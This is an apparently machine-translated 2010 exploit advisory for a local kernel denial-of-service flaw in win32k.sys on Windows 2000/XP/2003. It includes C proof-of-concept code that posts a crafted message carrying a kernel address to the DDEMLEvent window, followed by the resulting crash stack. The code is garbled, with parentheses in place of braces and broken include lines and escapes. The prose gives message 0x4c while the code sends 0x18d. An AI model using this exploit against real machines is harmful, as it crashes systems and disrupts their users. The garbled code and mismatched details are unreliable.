Windows 2000/XP/2003 win32k.sys SfnINSTRING local kernel Denial of Service Vulnerability 

Effect : Microsoft Windows 2000/XP/2003 full patch 


Author:MJ0011
Published: 2010-04-22


Vulnerability Details: 


Win32k.sys in DispatchMessage when the last call to xxxDefWindowProc, this function in dealing with some 
Message, will call gapfnScSendMessage this function table function to process,
which under the deal 2000/xp/2003 0x4c No. message, there will be SfnINSTRING function called this function when the lParam is not empty, 
direct that the lParam is a memory pointer, and pull data directly from the address
despite the use of the function of the SEH, but as long as the kernel address transmission errors will still cause the system BSOD 


Exploit code: 

# Include "stdafx.h" 
# Include "windows.h" 
int main (int argc, char * argv []) 
( 
printf("Microsoft Windows Win32k.sys SfnINSTRING Local D.O.S Vuln\nBy MJ0011\nth_decoder$126.com\nPressEnter");

getchar();

HWND hwnd = FindWindow ("DDEMLEvent", NULL); 

if (hwnd == 0) 
( 
printf ("cannot find DDEMLEvent Window! \ n"); 
return 0; 
) 

PostMessage (hwnd, 0x18d, 0x0, 0x80000000); 


return 0; 
) 

Common crash stack: 

kd> kc 

win32k! SfnINSTRING 
win32k! xxxDefWindowProc 
win32k! xxxEventWndProc 
win32k! xxxDispatchMessage 
win32k! NtUserDispatchMessage 
.... 

Windows 7/Vista no such problem 

Thanks: 

Thanks to my colleagues LYL to help me discovered this vulnerability 




th_decoder
2010-04-22